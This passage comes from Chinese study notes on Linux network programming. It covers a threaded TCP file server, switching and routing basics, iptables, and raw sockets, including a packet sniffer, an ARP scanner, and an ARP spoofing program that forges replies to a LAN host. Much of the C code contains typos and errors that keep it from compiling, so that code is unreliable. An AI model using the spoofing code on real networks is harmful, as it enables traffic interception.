        send(new_fd, head, strlen(head), 0);
        //不停给客户端发送文件数据
        while(1)
        {
            //从本地文件读取数据
        	unsigned char = buf[1024] = "";
            int ret = read(fd, buf, sizeof(buf));
            if(ret < 1024) // 文件末尾，将数据发送出去
            {
                send(new_fd, buf, ret, 0); //此处“ret”为有多少发多少
                break;
            }
            send(new_fd, buf, ret, 0);
        }
        close(fd); //关闭本地文件描述符
    }
    
    
    close(new_fd);
    return NULL;
}

//运行方式：./a.out 8000
int main(int argc, char *argv[])
{
    if(argc != 2)
    {
        printf("./a.out 8000\n");
        return 0;
    }
    
    //1.创建套接字
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    //2.端口复用
    int yes = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    
    //3.bind
    struct sockaddr_in my_addr;
    bzero(&my_addr, sizeof(my_addr));
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(atoi(atgv[1]));//命令参数argv[1]为端口名
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    int ret = bind(sockfd, (struct sockaddr*)&my_addr, sizeof(my_addr));
    if(bind == -1)
    {
        perror("bind");
    }
    
    //4.调用listen将sockfd主动变被动，同时创建链接队列
    listen(sockfd,15);
    
    //5.4.提取完成链接的客户端 accept
    //accept 提取一次只能提取一个客户端，若需要反复多次提取，用while循环
    while(1)
    {
        struct sockaddr_in cli_addr;
        socklen_t cli_len = sizeof(cli_addr);
        int new_fd = accept(sockfd, (struct sockaddr*)&cli_addr, cli_len);// 获取成功连接的套接字
        
        //遍历客户端的信息ip、port
        unsigned short port = ntohs(cli_addr.sin_port);
        char ip[16] = "";
        inet_ntop(AF_INET, &cli_addr.sin_addr.s_addr, ip, 16);
        printf("已有客户端:%s:%hu连接上了服务器\n"ip,port);
        
        //创建线程 服务于客户端
        pthread_t tid;
        //             线程地址，属性，核心服务函数，已连接套接字地址
        pthread_create(&tid,NULL,deal_client_fun,(void *)new_fd);
        pthread_detach(tid);
    }
    
    close(sockfd);
    return 0;
}
```



## 五、网络通信过程

获取目的Mac地址到ARP表中的过程：

![image-20210901175313404](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901175313404.png)

#### 1.集线器

拓扑结构示例：

![image-20210901180215332](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901180215332.png)

![image-20210901175445659](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901175445659.png)

**TTL（生命周期）：**一般初始值为64或128，单向。每经过一个路由器，TTL就减一，如果减到0都没有到达目的主机，就会被网络丢弃。

**ARP：**请求是广播，对方应答是单播。

**ICMP报文：**单播请求，单播应答。

**集线器(Hub)：**①任何一个发送到集线器上的数据，都会被转发到与集线器相连的所有设备上。(类似广播)	②工作在**物理层**	③共享带宽（带宽：单位传输速度）	④整形放大



#### 2.交换机

##### 2.1 拓扑结构示例：

![image-20210901182041696](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901182041696.png)

![image-20210901182139208](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901182139208.png)

##### 2.2 交换机：

1.功能：

​	①转发过滤：当一个数据帧的目的地址在MAC地址表中有映射时，它被转发到连接目的节点的端口而不是所有端口（如该数据帧为广播/组播帧，则转发至所有端口）

​	②**自主学习功能：**以太网交换机了解每一端口相连设备的MAC地址，并将地址相应的端口映射起来存放在交换机缓存中的MAC地址中。

​	③目前交换机还具备了一些新的功能，如对**VLAN（虚拟局域网）**的支持、对链路汇聚的支持，甚至有的还具有防火墙的功能



2.作用

​	①单播发送	

​	②a. 核心工作在链路层，也叫二层交换机。

​		b. 也有三层交换机（核心层在链路层，只是具备第三层（网络层）的功能，VLAN虚拟局域网划分）

​		c. 也有四层交换机（核心层在链路层，只是具备第四层（传输层）的功能，端口映射的映射）

​	③独享带宽，类似时分复用（背部总线、二阶矩阵算法）

​	④拓展网口

![image-20210901191804755](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210901191804755.png)



##### 2.3 路由器(重要)

##### 1.介绍

​	网关设备（Gateway），不同**网段**通信的桥梁。工作在网络层。



##### 2.网关

​	路由器的一个链接子网的接口。当前子网内的所有主机，如果想访问外网，数据必须先到达网关。**网关必须和子网、主机是同一网段**，否则需另加路由器。

​	一般地，路由器的IP地址与网关一致，为 198.168.1.1/24 或 192.168.1.254（即最小或最大），以便分配。

![image-20210907164124244](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210907164124244.png)

*注：上图未配置，配置完且接通为绿色，但是否能通信，还配置网关、路由表的 ” 下一跳 “ 。*



##### 3.常见问题

（1）

![image-20210907174255967](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210907174255967.png)

**原因：**路由器收到数据，不知道如何转发该数据

**解决办法：**

​	设置转发规则（路由表），

![image-20210907192145947](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210907192145947.png)



![image-20210907194928034](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210907194928034.png)

**小结：**

​	不同网段通信，**IP**不会发生变化，但**Mac**会一直变化；

​	**IP**表示的是发送者和接收者的主机（不变）,类似 “ 寄件人和收件人 ” ；

​	**Mac**表示的是，数据是通过一个个网卡设备，到达目的主机（变化），类似 “ 在中转站的快递员 ” ；





（2）给路由器添加一块网卡

![image-20210912174303841](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210912174303841.png)

成功：![image-20210912174355581](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210912174355581.png)



##### 问：以下路径，在没有配置路由表的情况下，是否能ping通？

![image-20210912174906830](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210912174906830.png)

答：能，同一路由器的网段，无需配置路由表也能通信。



##### 4.浏览器访问web服务器

Webserver：网页服务器

DNS：域名解析服务器（将域名（www.baidu.com）**——转换成——>**  对应web服务器IP）

![image-20210912175656440](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210912175656440.png)

![image-20210912181554684](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210912181554684.png)

##### 5.划分子网

![image-20210915163756769](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210915163756769.png)



##### 6.跨外网不同局域网通信

（1）映射（无桥梁）

![image-20210915163940436](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210915163940436.png)

（2）映射（有桥梁）

​		*以QQ为例*

![image-20210915164123443](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210915164123443.png)



### 六、Linux防火墙

#### 6.1防火墙

##### 1.认识防火墙

定义：被定义成一个或一组设备，它在网络之间执行访问控制策略

（下图为防火墙设置一般示意图）

![image-20210916172204807](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916172204807.png)

**注意：**防火墙只能防外，不能防内



##### 2.防火墙分类

​	硬件防火墙：一个独立的设备，用于访问控制

​	软件防火墙：一个软件，用于访问控制

 

##### 3.防火墙的作用

1）切割被信任（如子域）与不被信任（如Internet）的网段

2）划分出可提供Internet的服务与必须受保护的服务

3）分析出可接受与不可接受的数据包状态



##### 4.防火墙设置

第一种：

![image-20210916174027558](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916174027558.png)

第二种：

![image-20210916174101299](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916174101299.png)



##### 5.使用限制

防火墙是对数据的有效阻断，并不能有效阻止病毒或木马程序



#### 6.2Linux的数据包过滤软件——iptables（会使用即可）

##### 1.

 ![image-20210916174531512](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916174531512.png)

![image-20210916174513702](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916174513702.png)

**运行逻辑：**

​		对比结构符合Rule1，此时这个网络数据包就会进行Action1的动作，而不会理会后续的Rule2、Rule3等规则。





![image-20210916175440300](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916175440300.png)

![image-20210916180816432](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916180816432.png)





![image-20210916180350203](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916180350203.png)





![image-20210916181014889](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916181014889.png)



![image-20210916183036558](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916183036558.png)

![image-20210916183217799](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916183217799.png)



##### 例1：设置lo成为受信任的设备，即进出lo的数据包都给予接收

![image-20210916183644890](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916183644890.png)

##### 例2：只要来自内网的（172.20.223.0/24）的数据包都接收

![image-20210916183830703](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210916183830703.png)



##### 例3：想连接到本机

![image-20210917110709185](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917110709185.png)





##### 对Mac与state的防火墙设置：

##### ![image-20210917111153850](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917111153850.png)



例1：只要已建立或相关封包就予通过，只要是不合法封包就丢弃

![image-20210917111359818](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917111359818.png)



例2：针对局域网络内的Mac（aa:bb:cc:dd:ee:ff）地址主机放行

![image-20210917111617450](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917111617450.png)



**总结：防火墙重心针对的是报文，比如协议、IP、端口、Mac地址**



### 七、原始套接字

#### 7.1原始套接字概述

##### 1.原始套接字（SOCK_RAW）

1、一种不同于 **SOCK_STREAM、SOCK_DGRAM** 的套接字，它实现于系统核心

2、可以接收本机网卡上所有的数据帧（数据包），对于监听网络流量和分析网络数据很有作用

3、开发人员可以发送自己组装的数据包到网络上

4、广泛应用于高级网络编程

5、网络专家、黑客通常会用此来编写*奇特的网络程序*



##### 2.TCP/IP、UDP、原始套接字之间区别

​	流式套接字————只能收发TCP协议的数据

​	数据报套接字————只能收发UDP协议的数据

​	原始套接字————可以收发

​	1、内核没有处理的数据包，因此访问其他协议

​	2、发送的数据需要使用原始套接字**（SOCK_RAW）**

![image-20210917164432195](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917164432195.png)



#### 7.2 创建原始套接字

##### 1.原始套接字

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
int socket(PF_PACKET,SOCK_RAW,protocol); //链路层、原始套接字、指定可以接收或发送的数据包类型
```

##### 功能：

​	创建链路层的原始套接字

##### 参数：

​	protocol：指定可以接收或发送的数据包类型

​			ETH_P_IP ：IPV4 数据包

​			ETH_P_ARP ：ARP 数据包

​			ETH_P_ALL ：任何协议类型的数据包

##### 返回值：

​	成功 (>0)：链路层套接字

​	失败 (<0)：出错

##### 相关头文件：

​	#include <sys/socket.h>

​	#include <netinet/ether.h>



##### 2.创建链路层的原始套接字

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>

int main()
{
    //创建一个链路层的原始套接字
    int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    printf("fd = %d\n",fd);
    
    close(fd);
    return 0;
}

```

结果：

![image-20210917165936543](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210917165936543.png)

**小结：一般运行会失败（-1），原因可能是权限不够，需要使用sudo（超级权限）来运行原始套接字**



#### 7.3数据封包结构

##### 1.相关包含头文件

ubuntu12.04中描述网络协议结构的文件如下：

![image-20210922133946509](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922133946509.png)



##### 2.数据报文结构

![image-20210922134223999](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922134223999.png)



组装/拆解udp数据包流程：

![image-20210922134802762](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922134802762.png)





##### 3.IP封包格式

![image-20210922142941077](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922142941077.png)



##### 4.Ethernet封包格式

![image-20210922144258291](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922144258291.png)

![image-20210922144314805](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922144314805.png)

**PS：某报文后包含的东西称为此报文的数据**



##### 5. ICMP封包格式

![image-20210922160838178](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922160838178.png)



#### 7.4数据包的分析

##### 1.链路层数据格式

![image-20210922162320559](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922162320559.png)

![image-20210922163736184](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210922163736184.png)



*案例：网络分析器（抓包）*

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <string.h>

int main()
{
    //1、创建一个原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    printf("sockfd = %d\n",sockfd);
    
    //2、使用recvfeom接收网络数据
    while(1)
    {
        //定义buf存放帧数据  大小1500 unsigned char
        unsigned char[1500] buf = "";
        int len = recvfrom(sockfd, buf, sizeof(buf),0,NULL,NULL);
        printf("len = %d\n",len);
        
    //buf不要用%s来遍历，帧数据大多是不识别的ASCLL码值，有很多0x00
    //printf("buf=%s\n",buf);
        
        //解析buf——>mac头信息——>必须明白mac头的结构
        //mac头部：目的mac(6B),源mac(6B),类型(2B)
        //[mac][ip][tcp/udp][data]  ff:ff:ff:ff:ff:ff
        char src_mac[18] = "";
        char dst_mac[18] = "";
        
        //目的mac,源mac拼接到buf中，按上面的格式
       	sprintf(dst_mac,"%02x:%02x:%02x:%02x:%02x:%02x",\
               buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
        sprintf(src_mac,"%02x:%02x:%02x:%02x:%02x:%02x",\
            buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
        printf("%s--->%s\n",src_mac,dst_mac);
        
        //判断mac头部中协议类型 
        //IP:0x0800  ARP:0x0806 RARP:0x8035
        unsigned short mac_type = ntohs(*(unsigned short *)(buf+12));
        if( mac_type == 0x0800 )
        {
            printf("mac_type = %#x IP报文\n",mac_type);
            //2、分析IP头部
            unsigned char *ip_addr = buf+14;//跳过mac头部
            //ip_addr跳到源IP的起始位置
            ip_addr += 12;
            char src_ip[16] ="";
            char dst_ip[16] ="";
            sprintf(src_ip,"%d.%d.%d.%d", \
            ip_addr[0],ip_addr[1],ip_addr[2],ip_addr[3]);
            
            //ip_addr跳到目的IP的起始位置
            ip_addr += 4;
            sprintf(dst_ip,"%d.%d.%d.%d", \
            ip_addr[0],ip_addr[1],ip_addr[2],ip_addr[3]);
            printf("%s--->%s\n",src_ip,dst_ip);
            
            //判断完成网络层的上一层协议类型
            ip_addr = buf+14;
            unsigned char *ip_type = ip_addr+9;
            if(*ip_type == 1)
            {
                printf("ICMP报文\n");
            }
            else if(*ip_type == 2)
            {
                printf("IGMP报文\n");
            }
            else if(*ip_type == 6)
            {
                printf("TCP报文\n");
                ip_addr = buf+14;//IP报文起始位置
                //提取IP报文的头部长度
                int ip_head_len = (*ip_addr&0x0f)*4;
                unsigned char *tcp_addr = \
                    buf+14+ip_head_len;
                unsigned src_port = ntohs(*(unsigned short *)tcp_addr);
                unsigned dst_port = ntohs(*(unsigned short *)(tcp_addr+2));
                printf("%hu--->%hu\n",src_port, dst_port);
                unsigned char *tcp_headlen_addr = tcp_addr+12;
                //获取TCP首部长度
                int tcp_head_len = ((*tcp_headlen_addr>>4)&0x0f)*4;
               printf("TCP:%s\n", tcp_addr+tcp_head_len);
                
            }
            else if(*ip_type == 17)
            {
                printf("UDP报文\n");
                ip_addr = buf+14;//IP报文起始位置
                //提取IP报文的头部长度
                int ip_head_len = (*ip_addr&0x0f)*4;
                unsigned char *udp_addr = \
                    buf+14+ip_head_len;
                unsigned src_port = ntohs(*(unsigned short *)udp_addr);
                unsigned dst_port = ntohs(*(unsigned short *)(udp_addr+2));
                printf("%hu--->%hu\n",src_port, dst_port);
                printf("%s\n",udp_addr+8);//打印应用层数据
                
            }
            
        }
        else if( mac_type == 0x0806 )
        {
            printf("mac_type = %#x ARP报文\n",mac_type);
        }
        else if( mac_type == 0x8035 )
        {
            printf("mac_type = %#x RARP报文\n",mac_type);
        }
    }
    
    //关闭套接字
    close(sockfd);
    return 0;
}

```

运行结果：

![image-20210924164346064](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924164346064.png)



##### 2.混杂模式（了解）

![image-20210924165801245](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924165801245.png)

![image-20210924165901012](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924165901012.png)

![image-20210924165834699](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924165834699.png)



#### 7.5原始套接字发送数据——sendto

##### 1.原始套接字sendto函数

```c
sendto(sock_raw_fd, msg, msg_len,0,(struct sockaddr *)&sll, sizeof(sll));
```

注意：

​	1、sock_raw_fd：原始套接字

​	2、msg：发送的信息（封装好的协议数据）

​	3、**sll**：本机网络接口，指发送的数据应该从本机的哪个网卡出去，而不是以前的目的地址结构

![image-20210924180013511](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924180013511.png)

原始套接字作用：**组帧数据报文---->从本机的哪块网卡（sendto）发出去**



##### 2.本机网络接口地址结构——sll

```c
#include <netpacket/packet.h>
struct sockaddr_ll sll;
//结构（了解）
struct sockaddr_ll
{
    unsigned short int sll_family;   /*一般为PF_PACKET*/
    unsigned short int sll_protocol; /*上层协议*/
    int sll_ifindex;//               /*接口类型（重点）*/
    unsigned short int sll_hatype;   /*报头类型*/
    unsigned char sll_pkttype;       /*包类型*/
    unsigned char sll_halen;         /*地址长度*/
    unsigned char sll_addr[8];       /*MAC地址*/
};
//只需对sll.sllifindex赋值，即可使用
```

```c
sll.sll_ifindex = 本机接口;  //关键就是本地接口如何获得
sendto(sock_raw_fd, msg, msg_len,0,(struct sockaddr *)&sll, sizeof(sll));
```



##### 3.通过ioctl来获取网络接口地址

相关头文件：

```c
struct ifreq: #include<net/if.h>
IFNAMSIZ 16
```



```c
#include <sys/ioctl,h>
int ioctl(int fd, int request, void *)
```

![image-20210924172145971](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924172145971.png)

ioctl参数对照表：

![image-20210924181644413](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924181644413.png)



##### 4.案例：扫描mac地址——ARP

##### ARP（Address Resolution Protocol，地址解析协议）

![image-20210924182246715](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924182246715.png)

在linux和windows系统下查看ARP方式：

![image-20210924182405746](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924182405746.png)



ARP工作流程：

![image-20210924182501628](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210924182501628.png)



##### 5.ARP协议格式

![image-20210928161614700](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210928161614700.png)





*示例代码：ARP 请求某台主机的MAC*

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <sys/ioctl,h>//ioctl
#include<net/if.h>//struct ifreq
#include <netpacket/packet.h>
#include<pthread.h>
#include<unistd.h>//_exit
#include<string	.h>//strncpy

void my_sendto(char *outifc, unsigned char *msg, int msg_len);
void *recv_msg(void *arg)
{
    int sockfd = (int)arg;
    while(1)
    {
        unsigned char buf[1500]="";
    	recvfrom(sockfd, buf,sizeof(buf),0,NULL,NULL);
        if(ntohs((unsigned short *)(buf+12))==0x0806)//arp报文
        {
           if(ntohs((unsigned short *)(buf+14+6))==2)//应答
           {
               //获取mac
               unsigned char tmp_ip[]={192,168,0,108};
               if(memcmp(tmp_ip,buf+14+6+8,4) == 0)
               {
                   //获取目的的源mac
                   char mac[18] = "";
        sprintf(mac,"%02x:%02x:%02x:%02x:%02x:%02x",
    	buf[6+0],buf[6+1],buf[6+2],buf[6+3],buf[6+4],buf[6+5]);
                   
                   //获取目的的源IP
                   char ip[16]="";
                   sprintf(ip,"%d.%d.%d.%d",\
                   buf[28],buf[28+1],buf[28+2],buf[28+3]);
                   //打印IP,MAC
                   printf("IP:%s--->MAC:%s\n",ip,mac)
                   break;
               }
               
           }
        }
    }
    return NULL;
}

int main()
{
    //1、创建原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //msg存放请求报文
    unsigned char msg[] = {
        
        /*mac报文头部*/
        0xff,0xff,0xff,0xff,0xff,0xff,/*目的mac地址*/
        0x7C,0xB5,0x9B,0x2D,0xCA,0xB7,/*源mac地址*/
        0x08,0x06,/*帧类型*//*大端，高字节低地址*/
            
        /*ARP报文头部*/
        0x00,0x01,/*硬件类型*/
        0x08,0x00,/*协议类型*/
        0x06,/*硬件地址长度*/
        0x04,/*协议地址长度*/
        0x00,0x01,/*1 ARP请求*/
        0x7C,0xB5,0x9B,0x2D,0xCA,0xB7,/*源mac地址*/
        192,168,0,107,/*源IP*/
        0x00,0x00,0x00,0x00,0x00,0x00,/*目的mac地址,未知写0*/
        192,168,0,0,/*目的IP*/
            
    };
    
    //创建线程，接收arp应答
    pthread_t tid;
    pthread_create(&tid,NULL,recv_msg, (void *)sockfd);
    
    //发送arp请求帧数据
    my_sendto(sockfd, "0xb", msg, 42);
    
    //等待线程结束
    pthread_join(tid,NULL);
   
    close(sockfd);
    return 0;
}

//封装函数
void my_sendto(int sockfd, char *outifc, unsigned char *msg, int msg_len)
{
    //通过ioctl得到网络接口
    struct ifreq ethreq;
    strncpy(ethreq.ifr_name,outifc,IFNAMSIZ);//指定网卡名称
    //得到网络接口
    if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
    {
        perror("ioctl");
        close(sockfd);
        exit(-1);
    }
    
    //帧数据 出去的本地接口
    struct sockadr_ll sll;
    bzero(&sll,sizeof(sll));
    
    sll.sll_ifindex = ethreq.ifr_ifindex;
    
    //2、发送组好的帧数据
    sendto(sockfd,msg,msg_len,0,(struct sockaddr *)&sll,sizeof(sll));
}
```

运行结果：

![image-20210928163133097](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210928163133097.png)



##### 6.扫描整个局域网的mac

只需更改上面代码部分位置：

1）

![image-20210928165518109](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210928165518109.png)

2）

![image-20210928165053526](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210928165053526.png)



##### 7.ARP欺骗

![image-20210928171520967](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210928171520967.png)



*示例代码：*

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <sys/ioctl,h>//ioctl
#include<net/if.h>//struct ifreq
#include <netpacket/packet.h>
#include<pthread.h>
#include<unistd.h>//_exit
#include<string	.h>//strncpy

void my_sendto(char *outifc, unsigned char *msg, int msg_len);

int main()
{
    //1、创建原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    //msg存放请求报文
    unsigned char msg[] = {
        
        /*mac报文头部 14B*/
        0xC0,0xB5,0xD7,0xC4,0x3F,0x49,/*目的mac地址 XPmac*/
        0x00,0x00,0x00,0x00,0x00,0x00,/*源mac地址 全0假地址*/
        0x08,0x06,/*帧类型*//*大端，高字节低地址*/
            
        /*ARP报文头部 28B*/
        0x00,0x01,/*硬件类型*/
        0x08,0x00,/*协议类型*/
        0x06,/*硬件地址长度*/
        0x04,/*协议地址长度*/
        0x00,0x02,/*2 ARP应答*/
        0x00,0x00,0x00,0x00,0x00,0x00,/*源mac地址 全0同上*/
        192,168,0,107,/*源IP*/
        0xC0,0xB5,0xD7,0xC4,0x3F,0x49,/*目的mac地址 XPmac*/
        192,168,0,110,/*目的IP*/
            
    };
    
    //发送arp请求帧数据
    int i = 0;
    for(i=1;i<20;i++)//影响20秒
    {
        my_sendto(sockfd, "0xb", msg, 42);
        sleep(1);
    }
   
    close(sockfd);
    return 0;
}

//封装函数
void my_sendto(int sockfd, char *outifc, unsigned char *msg, int msg_len)
{
    //通过ioctl得到网络接口
    struct ifreq ethreq;
    strncpy(ethreq.ifr_name,outifc,IFNAMSIZ);//指定网卡名称
    //得到网络接口
    if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
    {
        perror("ioctl");
        close(sockfd);
        exit(-1);
    }
    
    //帧数据 出去的本地接口
    struct sockadr_ll sll;
    bzero(&sll,sizeof(sll));
    
    sll.sll_ifindex = ethreq.ifr_ifindex;
    
    //2、发送组好的帧数据
    sendto(sockfd,msg,msg_len,0,(struct sockaddr *)&sll,sizeof(sll));
}
```



#### 7.6结构体组包

##### 1.以太网结构体

![image-20210929174450633](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929174450633.png)

第二种形式：

![image-20210929174550349](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929174550349.png)



ARP头部：

![image-20210929173752927](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929173752927.png)



*示例代码：*

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <sys/ioctl,h>//ioctl
#include<net/if.h>//struct ifreq
#include <netpacket/packet.h>//struct sockaddr_ll
#include<pthread.h>
#include<unistd.h>//_exit
#include<string.h>//strncpy
#include<net/ethernet.h>//struct ether_header
#include<net/if_arp.h>//struct arphdr

void my_sendto(char *outifc, unsigned char *msg, int msg_len);

int main()
{
    //1、创建原始套接字
    int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        perror("socket");
        return 0;
    }
    
    /*目的mac 源mac 目的IP 源IP*/
    unsigned char dst_mac[6]={0xC0,0xB5,0xD7,0xC4,0x3F,0x49}; 
    unsigned char src_mac[6]={0x00};
    unsigned char dst_ip[4]={192,168,0,110};
    unsigned char src_ip[4]={192,168,0,107};
    
    unsigned char msg[1024]="";
    
    //1、组mac头部
    struct ether_header *eth_addr = (struct ether_header *)msg;
    //memcpy为内存操作的复制,参数分别为:目标地址,源地址,字节数
    //赋值目的mac地址
    memcpy(eth->ether_dhost,dst_mac,6);
    //赋值源mac地址
    memcpy(eth->ether_shost,src_mac,6);
    //赋值帧类型
    ether_addr->ether_type = htons(0x0806);
    
    //2、组成arp头部
    struct arphdr *eth_head = (struct arphdr *)(msg+14);//跳过mac头部
    arp_head->ar_hrd = htons(1);
    arp_head->ar_pro = htons(0x0800);
    arp_head->ar_hln = 6;
    arp_head->ar_pln = 4;
    arp_head->ar_op = htons(2);
    memcpy(arp_head->__ar_sha, src_mac,6);
    memcpy(arp_head->__ar_sip, src_ip,4);
    memcpy(arp_head->__ar_tha, dst_mac,6);
    memcpy(arp_head->__ar_tip, dst_ip,4);
    
    
    //发送arp请求帧数据
    int i = 0;
    for(i=1;i<20;i++)//影响20秒
    {
        my_sendto(sockfd, "0xb", msg, 42);
        sleep(1);
    }
   
    close(sockfd);
    return 0;
}

//封装函数
void my_sendto(int sockfd, char *outifc, unsigned char *msg, int msg_len)
{
    //通过ioctl得到网络接口
    struct ifreq ethreq;
    strncpy(ethreq.ifr_name,outifc,IFNAMSIZ);//指定网卡名称
    //得到网络接口
    if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
    {
        perror("ioctl");
        close(sockfd);
        exit(-1);
    }
    
    //帧数据 出去的本地接口
    struct sockadr_ll sll;
    bzero(&sll,sizeof(sll));
    
    sll.sll_ifindex = ethreq.ifr_ifindex;
    
    //2、发送组好的帧数据
    sendto(sockfd,msg,msg_len,0,(struct sockaddr *)&sll,sizeof(sll));
}
```



#### 7.7 原始套接字 发送普通udp信息

![image-20210929180340824](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929180340824.png)

1）组mac头部

```c
unsigned char msg[1024]="";
struct ether_header *eth_addr = (struct ether_header *)msg;
    //memcpy为内存操作的复制,参数分别为:目标地址,源地址,字节数
    //赋值目的mac地址
    memcpy(eth->ether_dhost,dst_mac,6);
    //赋值源mac地址
    memcpy(eth->ether_shost,src_mac,6);
    //赋值帧类型
    ether_addr->ether_type = htons(0x0800);
```

2）组ip头部

![image-20210929210256911](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929210256911.png)

![image-20210929210957312](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929210957312.png)

```c
#include <netinet/ip.h>//ip iphdr
struct iphdr *ip_hdr = (struct iphar *)(msg+14);
ip_hdr->version = 4;//IPv4版本
ip_hdr->ihl = 5;//IP头部长度 单位4B 总长为20B
ip_hdr->tos = 0;//服务类型
ip_hdr->tot_len = htons(20+8+data_len);//总长度=首部长度+数据长度
ip_hdr->id = htons(0);//标识
ip_hdr->frag_off =htons(0);//标志+片偏移
ip_hdr->ttl = 128;//生命周期，64或128
ip_hdr->protocol = 17;//协议  tcp是6  udp是17
ip_hdr->check = htons(0);//首部校验？？？
memcpy(&ip_hdr->saddr, src_ip, 4);//源IP地址
memcpy(&ip_hdr->daddr, dst_ip, 4);//目的IP地址
//ip报文头部校验
ip_hdr->check = checksum(ip_hdr, 20);

```

3）组udp头部

![image-20210929195413022](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20210929195413022.png)

```c
//自定义结构体 WEIHDR
typedef struct 
{
  	u_int32_t saddr;//源IP
